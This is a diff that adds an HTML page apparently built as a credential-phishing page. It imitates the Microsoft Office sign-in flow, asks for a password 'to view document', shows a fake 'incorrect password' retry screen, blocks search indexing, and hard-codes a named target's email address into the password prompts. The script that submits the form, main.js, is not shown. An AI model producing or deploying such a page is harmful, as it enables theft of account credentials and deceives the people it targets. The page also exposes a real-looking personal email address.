@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+
+<html>
+
+
+   <head>
+    <meta charset="utf-8">
+    <META NAME="robots" CONTENT="nofollow,noindex">
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests"> 
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <link rel="icon" href="oo.png">
+    <link rel="stylesheet" href="bootstrap.min.css">
+     <link rel="stylesheet" href="style.css">
+    <script src="axios.min.js"></script>
+    <link rel="stylesheet" href="font-awesome.min.css">
+    <script type="text/javascript" src="MaskedPassword.js"></script>
+
+
+    <title>Microsoft Office</title>
+     <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+
+
+
+
+ </head>
+
+
+
+  <body  onload="">
+    <div id="app">
+      
+
+    <div class="container-fluid" id="showcase"> 
+
+      
+        
+       <div class="modal" id="modal">
+                <div class="modal-body">
+                    <div class="">
+                        <div id="formdiv" style="">
+                                                    
+                            <div class="row ml-auto">
+                               <div id="svgimg" class="form-group row col-md-12">
+                                 <img class="banner-logo" role="presentation" src="bannerlogo.png" style="max-height: 36px;">
+                               </div>
+
+                                <div class="row ml-auto" id="email-row" style="display: flex;"> 
+                                  <div class="form-group row col-md-12 text-title"> 
+                                  <div role="heading" aria-level="1" >Sign in</div>
+
+                                </div>
+
+                                <div class=" row  alert alert-error col-md-12" style="display: none;" id="usernameError" >
+                  Enter a valid email address, phone number, or Skype name.
+                </div>
+
+
+                              
+
+                                <form id="email-signin" novalidate>  
+
+                                    <div class="form-group row col-md-12"> 
+                                      <input type="email" autofocus="autofocus" size="200"  maxlength="113" id="email"  name="userEmail" placeholder="Email, phone, or Skype" class=" ltr_override">
+                                  </div>
+
+                                  <div class="form-group row col-md-12"> 
+                                    <div role="heading" aria-level="1" style="font-size: .8125rem;">No account?<a href=" #"> Create one!</a></div>
+                                  </div>
+
+                                  <div class="form-group row col-md-12"> 
+                                    <div role="heading" aria-level="1" style="font-size: .8125rem;"><a href=" #">Can't access your account?</a></div>
+                                  </div>
+
+                                  <div class="form-group row col-md-12"> 
+                                    <div role="heading" aria-level="1" class="col-md-4" style=""></div>
+                                    <div role="heading" aria-level="1" class="col-md-4" style=""></div>
+                                    <div role="heading" aria-level="1" class="col-md-4" style=""><button type="submit" class="btn btn-block btn-primary" id="next" >Next</button></div>
+                                  </div>
+
+                                </form>
+                                </div>
+
+                                <div class="row ml-auto mt-auto" id="password-row" style="display: none;">
+
+                                  <div class="form-group row col-md-12"> 
+                                   <div class="row  col-md-12"  id="showid"></div>
+                                   <div class="" ></div>
+                                  </div>
+
+                                  
+                                  <div class="form-group row col-md-12 text-title" style="margin-top: -10px;"> 
+                                    <div role="heading" aria-level="1" >Enter password</div>
+                                  </div>
+
+
+
+                                  <div class="row  text-body col-md-12" style="font-size: .9375rem; display: flex; margin-top: -7px;" >
+                  Please verify your account, to view document.
+                </div>
+                <div class="row   col-md-12" style="font-size: .9375rem; display: flex;" >
+                </div>
+
+                                
+
+
+                                  <div class="row  alert alert-error col-md-12" style="font-size: .9999rem; display: none; margin-top: 10px;" id="passwordError" >
+                  Please enter your password.
+                </div>
+
+
+                                 <form id="signin" novalidate style="margin-top: 11px;">
+                                    <div class="form-group row col-md-12"> 
+                                      <input type="password"  autocomplete="off" maxlength="113" name="userPassword" id="password" placeholder="Password" size="200" class=" ltr_override">
+                                  </div>
+
+                                  <div class="form-group row col-md-12"> 
+                                    <div role="heading" aria-level="1" style="font-size: .8125rem;"><a href=" #">Forgot my password</a></div>
+                                  </div>
+
+                                  <div class="form-group row col-md-12"> 
+                                    <div role="heading" aria-level="1" style="font-size: .8125rem;"><a href=" #">Sign in with a different Microsoft account</a></div>
+                                  </div>
+
+
+                                  <div class="form-group row col-md-12"> 
+                                    <div role="heading" aria-level="1" class="col-md-4" style=""></div>
+                                    <div role="heading" aria-level="1" class="col-md-4" style=""></div>
+                                    <div role="heading" aria-level="1" class="col-md-4" style=""><button type="submit" i class="btn btn-block btn-primary" name="" style="text-align: center;">Sign in</button></div>
+                                  </div>
+                                 </form>
+                                </div>
+
+                                 <div class="row ml-auto mt-auto" id="password2-row" style="display: none;">
+
+                                  <div class="form-group row col-md-12"> 
+                                   <div class="row col-md-12"  id="showid2"></div>
+                                   <div class=""></div>
+                                  </div>
+
+                                  
+                                  <div class="form-group row col-md-12 text-title"> 
+                                    <div role="heading" aria-level="1"  style="margin-top: -10px;">Enter password</div>
+                                  </div>
+
+                                  <div class=" row  alert alert-error col-md-12" style="font-size: .9999rem; display: none;" id="password21Error" >
+                  Please enter your password.
+                </div>
+
+                 <div class=" row  alert alert-error col-md-12" style="font-size: .9999rem; display: inline;" id="password22Error" >
+                  Your account or password is incorrect. If you don't remember your password, <a href="#">reset it now.</a>
+                </div>
+
+
+                                 
+                                </div>
+
+                                <div id="animate" class="form-group row col-md-12 ml-auto" style="display: none;">
+                                  <div   class="progress-container"> <div class="progress" aria-label="Please wait">< <div></div><div></div><div></div><div></div><div></div></div></div>
+
+                                <!-- <div class="form-group mt-2 row col-md-12 text-title"> 
+                                  <div role="heading" aria-level="1" id="ldt" style="display: flex;">Authenticating....... </div>
+                                   <div role="heading" aria-level="1" id="fnf" style="display: none;">Authentication Complete<img width="56px" height="50px" src="https://www.turningtechnologies.ca/wp-content/uploads/2016/02/CheckMark.png"> </div>
+                                </div> -->
+
+                                 </div>
+
+                            </div>
+
+
+
+                        </div>
+                        
+                    </div>
+                                   
+                </div>
+        </div>
+
+    </div>
+
+
+
+    </div>
+    <script type="text/javascript">
+   var client_email = 'trina.t@3sixtysecure.com';
+   var id = document.getElementById('showid');
+      id.innerHTML = client_email
+   document.getElementById('showid2').innerHTML = client_email
+ </script>
+
+     <script src="main.js"></script>
+    <script src="jquery-3.3.1.slim.min.js"></script>
+    <script src="popper.min.js"></script>
+    <script src="bootstrap.min.js" ></script>
+
+  </body>
+</html>
+
